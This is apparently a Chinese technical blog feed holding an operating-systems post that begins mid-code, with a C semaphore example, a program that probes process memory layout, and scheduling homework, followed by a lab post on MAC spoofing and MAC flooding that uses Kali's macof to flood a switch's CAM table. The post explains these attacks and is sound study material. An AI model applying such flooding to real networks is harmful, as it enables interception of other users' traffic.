class="line">sleep(<span class="number">1</span>);</span><br><span class="line">sema_signal(&amp;mutex);</span><br><span class="line">    sema_signal(&amp;apple);</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mother_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">    sema_wait(&amp;plate);</span><br><span class="line">    sema_wait(&amp;mutex);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"put orange"</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">sema_signal(&amp;mutex);</span><br><span class="line">    sema_signal(&amp;orange);</span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">son_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">sema_wait(&amp;apple);</span><br><span class="line">    sema_wait(&amp;mutex);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"get apple"</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sema_signal(&amp;mutex);</span><br><span class="line">    sema_signal(&amp;plate);</span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">daughter_entry</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//while(1)&#123;</span></span><br><span class="line">sema_wait(&amp;orange);</span><br><span class="line">    sema_wait(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"get orange"</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">    sema_signal(&amp;mutex);</span><br><span class="line">    sema_signal(&amp;plate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> father_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> mother_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> son_thread;</span><br><span class="line">    <span class="keyword">pthread_t</span> daughter_thread;</span><br><span class="line"></span><br><span class="line">sema_init(&amp;mutex, <span class="number">1</span>);</span><br><span class="line">  sema_init(&amp;apple, <span class="number">0</span>);</span><br><span class="line">  sema_init(&amp;orange, <span class="number">0</span>);</span><br><span class="line">  sema_init(&amp;plate, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;father_thread, <span class="literal">NULL</span>, &amp;father_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;mother_thread, <span class="literal">NULL</span>, &amp;mother_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;son_thread, <span class="literal">NULL</span>, &amp;son_entry, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;daughter_thread, <span class="literal">NULL</span>, &amp;daughter_entry, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(father_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(mother_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(son_thread,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(daughter_thread,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//while (1);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="随堂作业"><a class="markdownIt-Anchor" href="#随堂作业"></a> 随堂作业</h1><h2 id="todo-1-进程的内存布局"><a class="markdownIt-Anchor" href="#todo-1-进程的内存布局"></a> Todo 1 进程的内存布局</h2><h3 id="要求"><a class="markdownIt-Anchor" href="#要求"></a> 要求</h3><p>一般操作系统中，进程的每个段内部地址均连续，但段与段的相对次序可能不同。用C/C++语言写一个小程序，探测一个操作系统中进程的各段的相对位置(输出次序即可)。</p><h3 id="理论基础"><a class="markdownIt-Anchor" href="#理论基础"></a> 理论基础</h3><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/20190917221359663.png" width="500" height="600" alt="图片名称" align="center" id="174"><table><thead><tr><th style="text-align:center">栈(stack)</th><th style="text-align:left">由编译器自动分配、翻译。存放函数的参数值和局部变量值。操作方式类似数据结构中的栈</th></tr></thead><tbody><tr><td style="text-align:center">堆(heap)</td><td style="text-align:left">由程序员分配释放。程序员不释放，程序结束时有可能由OS释放。与数据结构中的堆不同，操作方式类似于链表</td></tr><tr><td style="text-align:center">bss</td><td style="text-align:left">存放未初始化的全局变量和静态变量</td></tr><tr><td style="text-align:center">数据段data</td><td style="text-align:left">存放初始化之后的全局变量、静态变量和常量</td></tr><tr><td style="text-align:center">代码段text</td><td style="text-align:left">程序代码主体，函数主体等。注意为二进制格式</td></tr></tbody></table><p>Linux 为 C 语言编程环境提供了 3 个全局符号（symbol）：etext、 edata 和 end，可在程序内使用这些符号以获取相应程序文本段、初始化数据段和非初始化数据段结尾处下一字节的地址。</p><h3 id="源代码"><a class="markdownIt-Anchor" href="#源代码"></a> 源代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> linux</span></span><br><span class="line"><span class="keyword">extern</span> etext, edata, <span class="built_in">end</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> bss_var;        <span class="comment">//未初始化全局变量存储在BSS段</span></span><br><span class="line"><span class="keyword">int</span> data_var = <span class="number">42</span>;  <span class="comment">//初始化全局变量存储在数据段</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> linux</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"etext          address: %p\n"</span>, &amp;etext);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"edata          address: %p\n"</span>, &amp;edata);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"end            address: %p\n"</span>, &amp;<span class="built_in">end</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"main(TEXT)     address: %p\n"</span>, &amp;main);  <span class="comment">//查看代码段main函数位置</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"data_var(DATA) address: %p\n"</span>, &amp;data_var);  <span class="comment">//查看数据段变量地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bss_var(BSS)   address: %p\n"</span>, &amp;bss_var);  <span class="comment">//查看BSS段变量地址</span></span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));  <span class="comment">//从堆中分配空间</span></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p(HEAP)        address: %p\n"</span>, p);   <span class="comment">//查看堆位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&amp;p(STACK)      address: %p\n"</span>, &amp;p);  <span class="comment">//查看栈位置</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">  <span class="keyword">auto</span> pHeap = (<span class="keyword">char</span> *)GetProcessHeap();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"default heap   address: %p\n"</span>, pHeap);</span><br><span class="line">  HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">void</span> *pp = HeapAlloc(hHeap, HEAP_NO_SERIALIZE, <span class="number">1012</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"private heap   address: %p\n"</span>, pp);</span><br><span class="line">  <span class="keyword">auto</span> bRetVal = HeapFree(hHeap, HEAP_NO_SERIALIZE, pp);</span><br><span class="line">  <span class="comment">// sleep(1000); //为方便使用VMMap查看Windows的进程地址空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);  <span class="comment">//释放申请的空间，以避免内存泄露</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a class="markdownIt-Anchor" href="#运行结果"></a> 运行结果</h3><p>下面分别在Linux、windows、macos系统上测试程序：</p><h4 id="linuxubuntu-18042-lts"><a class="markdownIt-Anchor" href="#linuxubuntu-18042-lts"></a> Linux(Ubuntu 18.04.2 LTS)</h4><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_15-41-06.png" width="1000" height="200" alt="图片名称" align="center" id="175"><p>从打印结果可知：</p><ol><li>TEXT段在地址 <code>0x7f27358008dd</code> 以下，DATA段的地址范围是：<code>0x7f27358008dd - 0x7f2735a01014</code>，BSS段的地址范围是：<code>0x7f2735a01014 - 0x7f2735a01020</code></li><li><code>main</code>的地址为<code>0x7f273580073a</code>，在TEXT段；初始化全局变量<code>data_var</code>的地址为<code>0x7f2735a01010</code>，在DATA段；  未初始化全局变量<code>bss_var</code>的地址为<code>0x7f2735a01018</code>，在 BSS 段内；</li><li>char* 变量 p 的值是 <code>0x7fffc693c470</code>，也就是由 malloc() 分配的一块内存空间的首地址，这块内存就在堆中；但是 p 本身存放在栈里，地址为<code>0x7fffce8516e0</code></li><li>综上，各段的相对位置(地址由低到高)：TEXT段、DATA段、BSS段、堆、栈。</li></ol><h4 id="windows-10"><a class="markdownIt-Anchor" href="#windows-10"></a> Windows 10</h4><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_15-42-26.png" width="1000" height="100" alt="图片名称" align="center" id="176"><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_16-41-10.png" width="1000" height="100" alt="图片名称" align="center" id="177"><p>从打印结果可知：TEXT段、DATA段、BSS段、栈的相对位置与linux、macos相同，只有堆的位置比较特殊，每次测试结果变化较大。</p><p>翻阅《Windows核心编程》：</p><ul><li>Windows下的堆主要有两种，进程的默认堆和自己创建的私有堆。</li><li>在程序启动时，系统在刚刚创建的进程虚拟地址空间中创建一个进程的默认堆，而且程序也可以通过 HeapCreate 函数来调用 ntdll 中的RtlCreateHeap 来创建自己的私有堆，所以一个进程中可以存在多个堆。</li><li>Windows下的malloc通过Win32 API HeapAlloc来实现，所以申请的堆空间来自私有堆。</li></ul><p>推测：</p><ul><li><p>默认堆遵守上面的经典模型，私有堆分配可能比较随意。</p></li><li><p>通过调用<code>GetProcessHeap()</code>来获取默认堆的位置，可能会出现想要的结果。</p></li></ul><p>但是仍然存在上述问题：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_17-41-36.png" width="1000" height="150" alt="图片名称" align="center" id="178"><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_17-42-17.png" width="1000" height="150" alt="图片名称" align="center" id="179"><p>最后在知乎上找到了答案：</p><blockquote><p>Windows的进程地址空间分布跟上面说的简化的Linux/x86模型颇不一样。<br>就算在没有ASLR的老Windows上也已经很不一样，有了ASLR之后就更加不一样了。</p><p>在Windows上不应该对栈和堆的相对位置做任何假设。</p><p>要想看个清楚Windows的进程地址空间长啥样，可以用Sysinternals出品的<a href="https://link.zhihu.com/?target=https%3A//technet.microsoft.com/en-us/library/dd535533.aspx" target="_blank" rel="noopener">VMMap</a>看看。</p></blockquote><p>使用VMMap查看：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_23-51-54.png" width="1000" height="500" alt="图片名称" align="center" id="180"><h4 id="macos"><a class="markdownIt-Anchor" href="#macos"></a> macOS</h4><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-09_15-52-50.png" width="1000" height="150" alt="图片名称" align="center" id="181"><p>从打印结果可知：各段的相对位置(地址由低到高)：TEXT段、DATA段、BSS段、堆、栈。</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>在简化的32位Linux/x86进程地址空间模型里，（主线程的）栈空间确实比堆空间的地址要高——它已经占据了用户态地址空间的最高可分配的区域，并且向下（向低地址）增长。借用Gustavo Duarte的<a href="https://link.zhihu.com/?target=http%3A//duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">Anatomy of a Program in Memory</a>里的图：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/215522854f166f7b5a537ccfa641c922_r.jpg" width="500" height="500" alt="图片名称" align="center" id="182"><p>《程序员的自我修养》也说<code>栈的地址比堆高，栈是向下增长的，堆是向上增长的。</code> 这个说法其实不够严谨。而且上图是简化模型，会有特例：</p><ol><li>虽然传统上，Linux上的malloc实现会使用<code>brk()/sbrk()</code>（这俩构成了上图中<code>Heap</code>所示的部分，这也是Linux自身所认为是heap的地方，用pmap可以看到这里被标记为[heap]），但这并不是必须的；一个malloc()完全可以只用或基本上只用mmap()来实现，此时一般说的“Heap”（malloc-heap）就不一定在上图<code>Heap</code>（Linux heap）所示部分，而会在<code>Memory Mapping Segment</code>部分散布开来。不同版本的Linux在分配未指定起始地址的mmap()时用的顺序不一样，并不保证某种顺序。<strong>而且mmap()分配到的空间是有可能出现在低于主可执行程序映射进来的<code>text Segment</code>所在的位置。</strong></li><li>Linux上多线程进程中，“线程”其实是一组共享虚拟地址空间的进程。只有主线程的栈是按照上面图示分布，其它线程的栈的位置其实是“随机”的——它们可以由pthread_create()调用mmap()来分配，也可以由程序自己调用mmap()之后把地址传给pthread_create()。既然是mmap()来的，其它线程的栈出现在<code>Memory Mapping Segment</code>的任意位置都不出奇，与用于实现malloc()用的mmap()空间很可能是交错出现的。</li></ol><p>至于Windows的进程地址空间分布跟上面说的简化的Linux/x86模型颇不一样。就算在没有ASLR的老Windows上也已经很不一样，有了ASLR之后就更加不一样了。</p><p>在Windows上不应该对栈和堆的相对位置做任何假设。</p><p>要想看清楚Windows的进程地址空间布局，可以用Sysinternals出品的<a href="https://link.zhihu.com/?target=https%3A//technet.microsoft.com/en-us/library/dd535533.aspx" target="_blank" rel="noopener">VMMap</a>看看。</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><ul><li><a href="https://blog.csdn.net/weixin_43555423/article/details/89319795" target="_blank" rel="noopener">C语言易错点汇总（二）</a></li><li><a href="https://blog.csdn.net/ywcpig/article/details/52303745" target="_blank" rel="noopener">程序内存空间（代码段、数据段、堆栈段）</a></li><li><a href="https://www.cnblogs.com/zafu/p/7399859.html" target="_blank" rel="noopener">C语言中内存分布及程序运行中(BSS段、数据段、代码段、堆栈）</a></li><li><a href="https://blog.csdn.net/u012218838/article/details/77834711" target="_blank" rel="noopener">Windows私有堆的使用</a></li><li><a href="https://www.freebuf.com/articles/system/156174.html" target="_blank" rel="noopener">浅析Windows下堆的结构</a></li><li><a href="https://www.zhihu.com/question/36103513/answer/66101372" target="_blank" rel="noopener">堆、栈的地址高低？ 栈的增长方向？</a></li></ul><h2 id="todo-2-进程相关"><a class="markdownIt-Anchor" href="#todo-2-进程相关"></a> Todo 2 进程相关</h2><h3 id="一-选择题"><a class="markdownIt-Anchor" href="#一-选择题"></a> 一、选择题</h3><ol><li><p>如果操作系统采用了非抢占式进程调度算法，则进程不可能出现以下哪种状态转换? <strong>B</strong></p><blockquote><p>A.执行到阻塞 B. 执行到就绪 C. 阻塞到就绪 D. 就绪到执行</p></blockquote></li><li><p>进程调度算法在选择进程时，只考虑处于哪个状态的进程? <strong>A</strong></p><blockquote><p>A.就绪 B.阻塞 C.执行 D.结束</p></blockquote></li><li><p>子程序的返回地址一般存在 <strong>A</strong></p><blockquote><p>A.栈B.堆C.数据段D.代码段</p></blockquote></li><li><p>哪个调度算法只有抢占式版本? <strong>D</strong></p><blockquote><p>A.先到先服务B. 短作业优先C. 优先级调度D. 轮转调度</p></blockquote></li></ol><h3 id="二-概念理解及应用"><a class="markdownIt-Anchor" href="#二-概念理解及应用"></a> 二、概念理解及应用</h3><h4 id="t14分"><a class="markdownIt-Anchor" href="#t14分"></a> T1(4分)</h4><p><strong>问题</strong>：为了解决能够同时服务多个客户的目的,开发人员设计了多线程程序，每次有新用户连接时创建一个新的服务线程，服务结束时销毁线程;同时，为了防止服务器瘫瘓,限制了服务线程的总数量为100个。但是在运行过程中，不断创建销毁线程引入了不必要的额外开销，你有什么办法避免这个开销?你的办法有什么缺点?</p><p><strong>解答如下</strong>：</p><p>采用线程池，把宝贵的资源放到一个池子中；每次使用都从里面获取，用完之后又放回池子供其他人使用。主要流程图如下：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/v2-9702bee4c343bce3289401dce83211c0_r.jpg" width="400" height="300" alt="图片名称" align="center" id="183"><p><strong>优点</strong>：</p><ol><li>降低资源开销：由于线程是反复利用的，降低了创建线程分配资源和销毁线程的开销。</li><li>提高响应速度：由于线程是提前预热的，因此减少了创建线程这段时间的开销。</li><li>提高系统资源可管理性：使用线程池统一分配、管理和监控。</li></ol><p><strong>缺点</strong>：</p><ol><li>当客户少时浪费资源</li><li>一个根本性的缺陷：<strong>连续争用问题</strong>。也就是多个线程在申请任务时，为了合理地分配任务要付出锁资源，对比快速的任务执行来说，这部分申请的损耗是巨大的。</li></ol><p>参考：<a href="https://zhuanlan.zhihu.com/p/161628226" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/161628226</a></p><h4 id="t24分"><a class="markdownIt-Anchor" href="#t24分"></a> T2(4分)</h4><p><strong>问题</strong>：《Unix编程艺术》提倡使用多进程编程，而不是多线程编程。你觉得可能的原因是什么?</p><p><strong>解答如下</strong>：</p><ol><li>多进程,本质上就可以避免多线程『共享内存数据』产生的 “corruotped memory” 问题；</li><li>多线程的程序非常难以正确的编写；</li><li>难以调试: 因为 数据依赖，时间依赖</li><li>线程破坏了抽象: 无法设计出模块化的程序</li><li>因为锁导致回调无法完成</li><li>进程隔离性好，一个进程挂了不影响另外一个进程。</li></ol><p>参考：</p><ul><li><a href="http://ifeve.com/why-threads-bad/" target="_blank" rel="noopener">http://ifeve.com/why-threads-bad/</a></li><li><a href="https://web.stanford.edu/~ouster/cgi-bin/papers/threads.pdf" target="_blank" rel="noopener">https://web.stanford.edu/~ouster/cgi-bin/papers/threads.pdf</a></li></ul><h3 id="三-计算题"><a class="markdownIt-Anchor" href="#三-计算题"></a> 三、计算题</h3><p>现有3个进程A、B、C到达时间和预计运行时间如下表所示。要求画出不同调度算法下进程运行的甘特图,并计算进程的平均周转时间。</p><table><thead><tr><th style="text-align:center">进程编号</th><th style="text-align:center">到达时间（毫秒）</th><th style="text-align:center">执行时间（毫秒）</th></tr></thead><tbody><tr><td style="text-align:center">A</td><td style="text-align:center">0</td><td style="text-align:center">9</td></tr><tr><td style="text-align:center">B</td><td style="text-align:center">1</td><td style="text-align:center">7</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">2</td><td style="text-align:center">4</td></tr></tbody></table><ol><li>先到先服务调度算法</li><li>短作业优先(非抢占)</li><li>抢占式短作业优先算法</li><li>时间片轮转算法(时间片为3毫秒)</li></ol><p><strong>改错</strong>：</p><p>T2：A C B 13ms</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/QQ图片20210523195240.jpg" width="1000" height="300" alt="图片名称" align="center" id="184"><h2 id="todo-3"><a class="markdownIt-Anchor" href="#todo-3"></a> Todo 3</h2>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MAC地址泛洪与欺骗</title>
      <link href="/2021/03/04/MAC%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/"/>
      <url>/2021/03/04/MAC%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-理论"><a class="markdownIt-Anchor" href="#1-理论"></a> 1 理论</h1><h2 id="11-原理"><a class="markdownIt-Anchor" href="#11-原理"></a> 1.1 原理</h2><p>MAC地址欺骗是数据链路层攻击，它是利用<strong>交换机端口学习的漏洞</strong>，通过客户端向交换机发送欺骗报文、攻击交换机的CAM表的方式，使交换机CAM表的记录与真实的主机对应MAC地址不一致，从而使交换机将报文错误转发给攻击者。</p><p>MAC地址泛洪攻击，每台交换机的CAM表都有最大记录条数，当交换机端口学习得到的记录大于交换机CAM表条数上限时，交换机收到一个网络帧，只要其目标主机的MAC地址不存在于该交换机CAM表中，那么该帧会以广播的方式发向交换机的每一个端口，此时的交换机就相当于一个集线器HUB，我们就可以监听网络中的所有通讯报文。</p><p>与ARP攻击不同：MAC地址欺骗改变的是端口/MAC地址映射关系，ARP攻击改变的是IP/MAC地址映射关系。</p><p>MAC地址泛洪攻击针对路由器不行，原因是路由器仅仅转发特定地址的数据包，不传送不支持路由协议的数据包传送和未知目标网络数据包的传送，从而可以防止广播风暴。参考：<a href="https://www.cnblogs.com/Lynn-Zhang/articles/5754336.html" target="_blank" rel="noopener">交换机和路由器的区别在哪里 一针见血通俗解答</a></p><p>实验网络拓扑如下：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-03-05_11-19-37.jpg" width="700" height="400" alt="图片名称" align="center" id="32"><h2 id="12-知识储备"><a class="markdownIt-Anchor" href="#12-知识储备"></a> 1.2 知识储备</h2><ul><li><strong>MAC地址</strong>：它是一个用来确认网络设备位置的位址。在<a href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">OSI模型</a>中，第三层网络层负责<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>，第二层数据链路层则负责MAC位址。MAC地址用于在网络中唯一标示一个<a href="https://baike.baidu.com/item/%E7%BD%91%E5%8D%A1" target="_blank" rel="noopener">网卡</a>，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址。由网络设备制造商生产时烧录在网卡(Network lnterface Card)的<a href="https://baike.baidu.com/item/EPROM/1690813" target="_blank" rel="noopener">EPROM</a>(一种闪存芯片，通常可以通过程序擦写)。<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80/150859" target="_blank" rel="noopener">IP地址</a>与MAC地址在计算机里都是以<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457" target="_blank" rel="noopener">二进制</a>表示的，IP地址是32位的，而MAC地址则是48位的，通常表示为12个16进制数，如：00-16-EA-AE-3C-40就是一个MAC地址。</li><li><strong>交换机</strong>：主要功能是在局域网内的主机之间转发数据帧，工作核心是<strong>端口/MAC地址映射表</strong>，这张表里记录了交换机每个端口同与之相连的主机MAC地址之间的对应关系。交换机接收从主机上传来的比特流之后，要先将其缓存成数据帧，然后通过分析帧头中的MAC地址，交换机就可以判断出数据的发送方和接收方，在映射表里查找与数据帧的目的MAC地址相对应的端口。若找到则发给目的主机；若找不到则以广播的方式将这个数据帧向除了源端口以外的其它所有端口转发，从而将数据发送给了目的主机，并记录端口与MAC地址的对应关系。</li></ul><h1 id="2-实战"><a class="markdownIt-Anchor" href="#2-实战"></a> 2 实战</h1><h2 id="21-mac地址欺骗"><a class="markdownIt-Anchor" href="#21-mac地址欺骗"></a> 2.1 MAC地址欺骗</h2><ol><li><strong>准备</strong>：没有交换机物理设备，vmware中桥接模式中有虚拟交换机(但是无法登陆后台)，所以只能利用路由器测试(也无法进入后台)，只能查看现象了。</li><li>此处未进行实践，可参考：<a href="https://blog.csdn.net/redwand/article/details/105388491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">MAC地址欺骗与MAC地址泛洪攻击（eNSP环境演示）</a></li></ol><h2 id="22-mac地址泛洪攻击"><a class="markdownIt-Anchor" href="#22-mac地址泛洪攻击"></a> 2.2 MAC地址泛洪攻击</h2><ol><li>以<code>kali</code>为攻击机，使用<code>macof</code>命令向网络中发送大量网络不存在的源mac地址，堵塞交换机(路由器)的CAM表；</li><li>攻击前，<code>Win物理机</code>可以ping通kali、node01、node02、node03；</li><li>攻击后，按道理此时的路由器中的CAM表中存在大量陌生MAC地址记录，但是目前无法查看；现象为：请求超时或间断ping通，但可以ping通外网及局域网内其它主机。</li></ol><h1 id="3-存在问题"><a class="markdownIt-Anchor" href="#3-存在问题"></a> 3 存在问题</h1><ul><li>没有物理交换机，虚拟交换机无法登陆后台</li><li>用路由器测试，但是无法登录后台查看CAM表，可参考：<a href="https://cloud.tencent.com/developer/article/1482014" target="_blank" rel="noopener">小米路由器开启SSH</a></li></ul><h1 id="4-参考"><a class="markdownIt-Anchor" href="#4-参考"></a> 4 参考</h1><ul><li><a href="https://baike.baidu.com/item/MAC%E5%9C%B0%E5%9D%80/1254181?fr=aladdin" target="_blank" rel="noopener">百度百科-MAC地址</a></li><li><a href="https://blog.csdn.net/weixin_34234829/article/details/85088965?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs" target="_blank" rel="noopener">MAC泛洪***的实施与防御</a></li><li><a href="https://blog.csdn.net/redwand/article/details/105388491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">MAC地址欺骗与MAC地址泛洪攻击（eNSP环境演示）</a></li><li><a href="https://www.youtube.com/watch?v=FiDq8g0gBsI" target="_blank" rel="noopener">亁颐堂现任明教教主CCNA Security 2019 7 第三天 2 MAC泛洪MAC欺骗</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP攻击</title>
      <link href="/2021/02/17/ARP%E6%AC%BA%E9%AA%97-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/"/>
      <url>/2021/02/17/ARP%E6%AC%BA%E9%AA%97-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/</url>
      
